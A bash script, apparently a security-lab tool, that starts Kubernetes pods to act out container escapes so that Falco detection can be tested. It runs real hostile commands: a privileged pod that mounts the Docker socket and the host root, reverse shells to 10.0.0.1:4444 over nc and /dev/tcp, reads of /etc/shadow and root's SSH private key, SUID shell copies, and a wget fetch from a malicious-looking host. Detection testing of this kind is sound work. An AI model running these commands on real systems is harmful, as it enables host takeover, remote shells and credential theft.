#!/bin/bash

# Project Sentinel - Container Escape Simulation
# This script simulates container escape attempts for demonstration purposes

set -e

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

print_status() {
    echo -e "${BLUE}[INFO]${NC} $1"
}

print_success() {
    echo -e "${GREEN}[SUCCESS]${NC} $1"
}

print_warning() {
    echo -e "${YELLOW}[WARNING]${NC} $1"
}

print_error() {
    echo -e "${RED}[ERROR]${NC} $1"
}

print_attack() {
    echo -e "${RED}[ATTACK]${NC} $1"
}

# Function to check if Falco is running
check_falco_status() {
    print_status "Checking Falco status..."
    
    if kubectl get pods -n sentinel-security -l app.kubernetes.io/name=falco | grep -q Running; then
        print_success "Falco is running and monitoring"
    else
        print_warning "Falco is not running. Deploy Falco first for better detection."
    fi
}

# Function to simulate Docker socket access
simulate_docker_socket_access() {
    print_attack "Simulating Docker socket access (container escape vector)"
    
    # Create a privileged pod that mounts Docker socket
    kubectl apply -f - << 'EOF'
apiVersion: v1
kind: Pod
metadata:
  name: docker-socket-attacker
  namespace: sentinel-apps
  labels:
    attack: container-escape
spec:
  securityContext:
    runAsUser: 0
  containers:
  - name: attacker
    image: alpine:latest
    command: ["/bin/sh"]
    args: ["-c", "sleep 300"]
    securityContext:
      privileged: true
    volumeMounts:
    - name: docker-socket
      mountPath: /var/run/docker.sock
    - name: host-root
      mountPath: /host
  volumes:
  - name: docker-socket
    hostPath:
      path: /var/run/docker.sock
  - name: host-root
    hostPath:
      path: /
  restartPolicy: Never
EOF

    # Wait for pod to be ready
    kubectl wait --for=condition=ready pod/docker-socket-attacker -n sentinel-apps --timeout=60s
    
    print_attack "Attempting to access Docker socket from container..."
    kubectl exec -n sentinel-apps docker-socket-attacker -- ls -la /var/run/docker.sock
    
    print_attack "Attempting to list Docker containers..."
    kubectl exec -n sentinel-apps docker-socket-attacker -- wget -qO- --post-data="" http://unix:/var/run/docker.sock:/containers/json || true
    
    print_attack "Attempting to access host filesystem..."
    kubectl exec -n sentinel-apps docker-socket-attacker -- ls -la /host/etc/passwd
    
    print_success "Container escape simulation completed"
}

# Function to simulate privilege escalation
simulate_privilege_escalation() {
    print_attack "Simulating privilege escalation attempts"
    
    # Create pod that attempts privilege escalation
    kubectl apply -f - << 'EOF'
apiVersion: v1
kind: Pod
metadata:
  name: privilege-escalator
  namespace: sentinel-apps
  labels:
    attack: privilege-escalation
spec:
  containers:
  - name: attacker
    image: ubuntu:20.04
    command: ["/bin/bash"]
    args: ["-c", "sleep 300"]
    securityContext:
      allowPrivilegeEscalation: true
      runAsUser: 1000
  restartPolicy: Never
EOF

    # Wait for pod to be ready
    kubectl wait --for=condition=ready pod/privilege-escalator -n sentinel-apps --timeout=60s
    
    print_attack "Attempting to escalate privileges with sudo..."
    kubectl exec -n sentinel-apps privilege-escalator -- sudo -l || true
    
    print_attack "Attempting to change file permissions..."
    kubectl exec -n sentinel-apps privilege-escalator -- chmod +s /bin/bash || true
    
    print_attack "Attempting to access /etc/shadow..."
    kubectl exec -n sentinel-apps privilege-escalator -- cat /etc/shadow || true
    
    print_attack "Attempting to create SUID binary..."
    kubectl exec -n sentinel-apps privilege-escalator -- cp /bin/sh /tmp/escalate || true
    kubectl exec -n sentinel-apps privilege-escalator -- chmod +s /tmp/escalate || true
    
    print_success "Privilege escalation simulation completed"
}

# Function to simulate reverse shell
simulate_reverse_shell() {
    print_attack "Simulating reverse shell connection"
    
    # Create pod for reverse shell simulation
    kubectl apply -f - << 'EOF'
apiVersion: v1
kind: Pod
metadata:
  name: reverse-shell-attacker
  namespace: sentinel-apps
  labels:
    attack: reverse-shell
spec:
  containers:
  - name: attacker
    image: alpine:latest
    command: ["/bin/sh"]
    args: ["-c", "apk add --no-cache netcat-openbsd && sleep 300"]
    securityContext:
      runAsUser: 0
  restartPolicy: Never
EOF

    # Wait for pod to be ready
    kubectl wait --for=condition=ready pod/reverse-shell-attacker -n sentinel-apps --timeout=60s
    
    print_attack "Attempting reverse shell with netcat..."
    kubectl exec -n sentinel-apps reverse-shell-attacker -- nc -e /bin/sh 10.0.0.1 4444 &
    sleep 2
    
    print_attack "Attempting bash reverse shell..."
    kubectl exec -n sentinel-apps reverse-shell-attacker -- bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' &
    sleep 2
    
    print_attack "Attempting shell over /dev/tcp..."
    kubectl exec -n sentinel-apps reverse-shell-attacker -- sh -c 'exec 5<>/dev/tcp/10.0.0.1/4444;cat <&5 | while read line; do $line 2>&5 >&5; done' &
    sleep 2
    
    print_success "Reverse shell simulation completed"
}

# Function to simulate cryptocurrency mining
simulate_crypto_mining() {
    print_attack "Simulating cryptocurrency mining activity"
    
    # Create pod that simulates mining
    kubectl apply -f - << 'EOF'
apiVersion: v1
kind: Pod
metadata:
  name: crypto-miner
  namespace: sentinel-apps
  labels:
    attack: crypto-mining
spec:
  containers:
  - name: miner
    image: alpine:latest
    command: ["/bin/sh"]
    args: ["-c", "sleep 300"]
    resources:
      limits:
        cpu: 100m
        memory: 128Mi
  restartPolicy: Never
EOF

    # Wait for pod to be ready
    kubectl wait --for=condition=ready pod/crypto-miner -n sentinel-apps --timeout=60s
    
    print_attack "Simulating XMRig mining process..."
    kubectl exec -n sentinel-apps crypto-miner -- sh -c 'echo "Simulating: /usr/bin/xmrig --url=stratum.mining.pool.com:4444" && sleep 5' &
    
    print_attack "Simulating mining connection..."
    kubectl exec -n sentinel-apps crypto-miner -- sh -c 'echo "Connecting to mining pool..." && sleep 3' &
    
    print_attack "Simulating cryptonight algorithm..."
    kubectl exec -n sentinel-apps crypto-miner -- sh -c 'echo "Running cryptonight algorithm" && sleep 5' &
    
    print_success "Cryptocurrency mining simulation completed"
}

# Function to simulate suspicious file access
simulate_sensitive_file_access() {
    print_attack "Simulating access to sensitive files"
    
    # Create pod that accesses sensitive files
    kubectl apply -f - << 'EOF'
apiVersion: v1
kind: Pod
metadata:
  name: file-accessor
  namespace: sentinel-apps
  labels:
    attack: file-access
spec:
  securityContext:
    runAsUser: 0
  containers:
  - name: attacker
    image: ubuntu:20.04
    command: ["/bin/bash"]
    args: ["-c", "sleep 300"]
    volumeMounts:
    - name: host-etc
      mountPath: /host/etc
    - name: host-root
      mountPath: /host/root
  volumes:
  - name: host-etc
    hostPath:
      path: /etc
  - name: host-root
    hostPath:
      path: /root
  restartPolicy: Never
EOF

    # Wait for pod to be ready
    kubectl wait --for=condition=ready pod/file-accessor -n sentinel-apps --timeout=60s
    
    print_attack "Attempting to read /etc/passwd..."
    kubectl exec -n sentinel-apps file-accessor -- cat /etc/passwd
    
    print_attack "Attempting to read /etc/shadow..."
    kubectl exec -n sentinel-apps file-accessor -- cat /etc/shadow || true
    
    print_attack "Attempting to access SSH keys..."
    kubectl exec -n sentinel-apps file-accessor -- ls -la /host/root/.ssh/ || true
    kubectl exec -n sentinel-apps file-accessor -- cat /host/root/.ssh/id_rsa || true
    
    print_attack "Attempting to read sudoers file..."
    kubectl exec -n sentinel-apps file-accessor -- cat /etc/sudoers || true
    
    print_success "Sensitive file access simulation completed"
}

# Function to simulate shell execution in containers
simulate_shell_execution() {
    print_attack "Simulating shell execution in containers"
    
    # Get a running application pod
    local app_pod=$(kubectl get pods -n sentinel-apps -l app=demo-web-service -o jsonpath='{.items[0].metadata.name}' 2>/dev/null || echo "")
    
    if [ -n "$app_pod" ]; then
        print_attack "Executing shell in application container: $app_pod"
        
        kubectl exec -n sentinel-apps "$app_pod" -- /bin/sh -c 'echo "Shell access gained!" && whoami && id'
        kubectl exec -n sentinel-apps "$app_pod" -- /bin/bash -c 'echo "Bash shell spawned" && ps aux'
        
        print_attack "Attempting to install packages..."
        kubectl exec -n sentinel-apps "$app_pod" -- apt-get update || true
        kubectl exec -n sentinel-apps "$app_pod" -- apt-get install -y netcat || true
        
        print_attack "Attempting to download and execute scripts..."
        kubectl exec -n sentinel-apps "$app_pod" -- wget -O /tmp/script.sh http://malicious-site.com/script.sh || true
        kubectl exec -n sentinel-apps "$app_pod" -- chmod +x /tmp/script.sh || true
        
    else
        print_warning "No application pods found for shell simulation"
    fi
    
    print_success "Shell execution simulation completed"
}

# Function to monitor Falco alerts
monitor_falco_alerts() {
    print_status "Monitoring Falco alerts (showing last 20 events)..."
    
    # Show Falco logs from the last 5 minutes
    kubectl logs -n sentinel-security -l app.kubernetes.io/name=falco --tail=20 --since=5m | grep -E "(CRITICAL|HIGH|WARNING)" || echo "No recent alerts found"
    
    print_status "To monitor real-time alerts, run:"
    echo "kubectl logs -n sentinel-security -l app.kubernetes.io/name=falco -f"
}

# Function to cleanup attack pods
cleanup_attack_pods() {
    print_status "Cleaning up attack simulation pods..."
    
    kubectl delete pod docker-socket-attacker -n sentinel-apps --ignore-not-found=true
    kubectl delete pod privilege-escalator -n sentinel-apps --ignore-not-found=true
    kubectl delete pod reverse-shell-attacker -n sentinel-apps --ignore-not-found=true
    kubectl delete pod crypto-miner -n sentinel-apps --ignore-not-found=true
    kubectl delete pod file-accessor -n sentinel-apps --ignore-not-found=true
    
    print_success "Cleanup completed"
}

# Function to generate attack report
generate_attack_report() {
    print_status "Generating attack simulation report..."
    
    local report_file="./scans/attack-simulation-report.txt"
    mkdir -p "$(dirname "$report_file")"
    
    cat > "$report_file" << EOF
============================================================
        CONTAINER ESCAPE ATTACK SIMULATION REPORT
============================================================
Date: $(date)
Cluster: $(kubectl config current-context)

ATTACK VECTORS SIMULATED:
1. Docker Socket Access - CRITICAL
2. Privilege Escalation - HIGH  
3. Reverse Shell Connections - CRITICAL
4. Cryptocurrency Mining - MEDIUM
5. Sensitive File Access - HIGH
6. Shell Execution in Containers - MEDIUM

DETECTION STATUS:
$(kubectl get pods -n sentinel-security -l app.kubernetes.io/name=falco -o jsonpath='{.items[0].status.phase}' 2>/dev/null || echo "Falco not detected")

RECOMMENDATIONS:
- Enable Pod Security Standards/Policies
- Implement runtime security monitoring with Falco
- Use read-only root filesystems
- Implement least privilege access controls
- Regular security scanning and monitoring
- Network segmentation and policies

============================================================
EOF
    
    print_success "Attack report generated: $report_file"
}

# Main function
main() {
    echo
    print_status "🔥 Starting Container Escape Attack Simulation..."
    print_warning "This simulation creates intentionally malicious pods for testing purposes"
    echo
    
    check_falco_status
    echo
    
    print_status "Phase 1: Docker Socket Access Attacks"
    simulate_docker_socket_access
    sleep 5
    echo
    
    print_status "Phase 2: Privilege Escalation Attacks"
    simulate_privilege_escalation
    sleep 5
    echo
    
    print_status "Phase 3: Reverse Shell Attacks"
    simulate_reverse_shell
    sleep 5
    echo
    
    print_status "Phase 4: Cryptocurrency Mining Simulation"
    simulate_crypto_mining
    sleep 5
    echo
    
    print_status "Phase 5: Sensitive File Access"
    simulate_sensitive_file_access
    sleep 5
    echo
    
    print_status "Phase 6: Shell Execution in Containers"
    simulate_shell_execution
    sleep 5
    echo
    
    print_status "Monitoring Falco alerts..."
    monitor_falco_alerts
    echo
    
    generate_attack_report
    echo
    
    print_warning "Attack simulation completed. Check Falco logs for detection alerts."
    print_status "Cleanup with: $0 cleanup"
}

# Handle script arguments
case "${1:-run}" in
    run)
        main
        ;;
    cleanup)
        cleanup_attack_pods
        ;;
    monitor)
        monitor_falco_alerts
        ;;
    *)
        echo "Usage: $0 [run|cleanup|monitor]"
        exit 1
        ;;
esac